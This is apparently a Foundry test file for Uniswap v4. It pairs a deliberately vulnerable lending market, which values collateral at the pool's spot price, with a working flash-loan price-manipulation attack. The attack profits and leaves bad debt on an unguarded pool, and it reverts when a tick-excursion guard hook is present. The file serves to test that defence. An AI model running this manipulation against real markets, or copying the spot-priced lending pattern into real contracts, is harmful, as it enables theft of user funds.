// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {Deployers} from "v4-core/test/utils/Deployers.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {Hooks} from "v4-core/src/libraries/Hooks.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {FullMath} from "v4-core/src/libraries/FullMath.sol";
import {StateLibrary} from "v4-core/src/libraries/StateLibrary.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {Currency} from "v4-core/src/types/Currency.sol";

/// @notice Deliberately vulnerable lending market: values token0 collateral at the pool's slot0 price.
contract VulnerableSpotLending {
    using StateLibrary for IPoolManager;

    IPoolManager public immutable manager;
    PoolId public immutable poolId;
    IERC20 public immutable collateralToken;
    IERC20 public immutable debtToken;
    uint256 public constant LTV_BPS = 8000;

    mapping(address => uint256) public collateralOf;
    mapping(address => uint256) public debtOf;

    constructor(IPoolManager _manager, PoolId _poolId, IERC20 _collateral, IERC20 _debt) {
        manager = _manager;
        poolId = _poolId;
        collateralToken = _collateral;
        debtToken = _debt;
    }

    /// @notice token1 per token0, 1e18-scaled, straight from slot0.
    function spotPrice() public view returns (uint256) {
        (uint160 sqrtPriceX96,,,) = manager.getSlot0(poolId);
        uint256 priceX96 = FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, 1 << 96);
        return FullMath.mulDiv(priceX96, 1e18, 1 << 96);
    }

    function maxBorrow(address user) public view returns (uint256) {
        uint256 limit = (collateralOf[user] * spotPrice() / 1e18) * LTV_BPS / 10_000;
        return limit > debtOf[user] ? limit - debtOf[user] : 0;
    }

    function deposit(uint256 amount) external {
        require(collateralToken.transferFrom(msg.sender, address(this), amount), "transfer");
        collateralOf[msg.sender] += amount;
    }

    function borrow(uint256 amount) external {
        require(amount <= maxBorrow(msg.sender), "undercollateralized");
        debtOf[msg.sender] += amount;
        require(debtToken.transfer(msg.sender, amount), "transfer");
    }
}

interface IFlashBorrower {
    function onFlash(address token, uint256 amount) external;
}

contract FlashLender {
    function flash(IERC20 token, uint256 amount) external {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(token.transfer(msg.sender, amount), "transfer");
        IFlashBorrower(msg.sender).onFlash(address(token), amount);
        require(token.balanceOf(address(this)) >= balanceBefore, "flash loan not repaid");
    }
}

/// @notice Single-transaction flash-loan manipulation of a slot0-priced lending market,
///         against an unguarded pool and against the same pool with TickExcursionGuardHook.
contract FlashLoanOracleManipulationPoC is Test, Deployers, IFlashBorrower {
    using PoolIdLibrary for PoolKey;

    uint24 internal constant MAX_DEV = 50;
    uint256 internal constant POOL_LIQUIDITY = 1e18;
    uint256 internal constant MARKET_FUNDS = 10e18;
    uint256 internal constant LENDER_FUNDS = 100e18;
    uint256 internal constant FLASH_AMOUNT = 1e18;

    IERC20 internal token0;
    IERC20 internal token1;
    PoolKey internal plainKey;
    PoolKey internal guardKey;
    VulnerableSpotLending internal plainMarket;
    VulnerableSpotLending internal guardMarket;
    FlashLender internal lender;

    PoolKey internal targetKey;
    VulnerableSpotLending internal targetMarket;

    function setUp() public {
        deployFreshManagerAndRouters();
        deployMintAndApprove2Currencies();
        token0 = IERC20(Currency.unwrap(currency0));
        token1 = IERC20(Currency.unwrap(currency1));

        address hookAddr = address(uint160(Hooks.BEFORE_SWAP_FLAG | Hooks.AFTER_SWAP_FLAG) ^ (0x4444 << 144));
        deployCodeTo("TickExcursionGuardHook.sol:TickExcursionGuardHook", abi.encode(manager, MAX_DEV), hookAddr);

        (plainKey,) = initPool(currency0, currency1, IHooks(address(0)), 3000, SQRT_PRICE_1_1);
        (guardKey,) = initPool(currency0, currency1, IHooks(hookAddr), 3000, SQRT_PRICE_1_1);
        _addFullRange(plainKey);
        _addFullRange(guardKey);

        plainMarket = new VulnerableSpotLending(manager, plainKey.toId(), token0, token1);
        guardMarket = new VulnerableSpotLending(manager, guardKey.toId(), token0, token1);
        token1.transfer(address(plainMarket), MARKET_FUNDS);
        token1.transfer(address(guardMarket), MARKET_FUNDS);

        lender = new FlashLender();
        token1.transfer(address(lender), LENDER_FUNDS);
    }

    function _addFullRange(PoolKey memory k) internal {
        IPoolManager.ModifyLiquidityParams memory p = LIQUIDITY_PARAMS;
        p.tickLower = TickMath.minUsableTick(k.tickSpacing);
        p.tickUpper = TickMath.maxUsableTick(k.tickSpacing);
        p.liquidityDelta = int256(POOL_LIQUIDITY);
        modifyLiquidityRouter.modifyLiquidity(k, p, ZERO_BYTES);
    }

    /// @dev Attack body, runs inside the flash loan.
    function onFlash(address, uint256 amount) external override {
        require(msg.sender == address(lender), "only lender");

        // 1. Buy token0 with the whole loan: pushes token0's spot price up.
        uint256 t0Before = token0.balanceOf(address(this));
        swap(targetKey, false, -int256(amount), ZERO_BYTES);
        uint256 collateral = token0.balanceOf(address(this)) - t0Before;

        // 2. Post it as collateral and borrow against the inflated price.
        token0.approve(address(targetMarket), collateral);
        targetMarket.deposit(collateral);
        uint256 b = targetMarket.maxBorrow(address(this));
        uint256 available = token1.balanceOf(address(targetMarket));
        targetMarket.borrow(b < available ? b : available);

        // 3. Repay the loan, keep the rest, abandon the collateral.
        require(token1.transfer(address(lender), amount), "repay");
    }

    function runAttack(PoolKey memory k, VulnerableSpotLending m, uint256 amount)
        external
        returns (int256 profit, uint256 badDebt)
    {
        targetKey = k;
        targetMarket = m;
        uint256 before = token1.balanceOf(address(this));
        lender.flash(token1, amount);
        uint256 afterBal = token1.balanceOf(address(this));
        profit = afterBal >= before ? int256(afterBal - before) : -int256(before - afterBal);
        // Fair price is 1:1 (pool initialised at SQRT_PRICE_1_1, arbitrage brings it back).
        uint256 debt = m.debtOf(address(this));
        uint256 coll = m.collateralOf(address(this));
        badDebt = debt > coll ? debt - coll : 0;
    }

    function test_Attack_WithoutGuard_IsProfitable() public {
        (int256 profit, uint256 badDebt) = this.runAttack(plainKey, plainMarket, FLASH_AMOUNT);
        console.log("POC_PRICE", plainMarket.spotPrice());
        console.log("POC_PROFIT", uint256(profit));
        console.log("POC_BADDEBT", badDebt);
        assertGt(profit, 0, "attack should profit on the unguarded pool");
        assertGt(badDebt, 0, "market should be left with bad debt");
    }

    function test_Attack_WithGuard_Reverts() public {
        uint256 marketBefore = token1.balanceOf(address(guardMarket));
        vm.expectRevert();
        this.runAttack(guardKey, guardMarket, FLASH_AMOUNT);
        assertEq(token1.balanceOf(address(guardMarket)), marketBefore, "market funds must be untouched");
        assertEq(guardMarket.debtOf(address(this)), 0);
    }

    function testFuzz_WithGuard_AttackNeverProfitable(uint256 amount) public {
        amount = bound(amount, 1e12, 50e18);
        try this.runAttack(guardKey, guardMarket, amount) returns (int256 profit, uint256) {
            assertLe(profit, 0, "attack must not be profitable under the guard");
        } catch {}
    }
}
